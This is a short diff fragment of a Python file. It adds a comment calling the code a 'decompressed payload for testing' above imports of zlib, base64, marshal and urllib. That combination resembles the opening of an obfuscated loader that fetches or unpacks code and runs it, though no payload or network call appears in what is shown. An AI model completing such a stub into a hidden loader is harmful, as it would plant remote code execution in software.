@@ -1,3 +1,4 @@
+# decompressed payload for testing
 import sys,zlib,base64,marshal,json,urllib
 if sys.version_info[0] > 2:
     from urllib import request
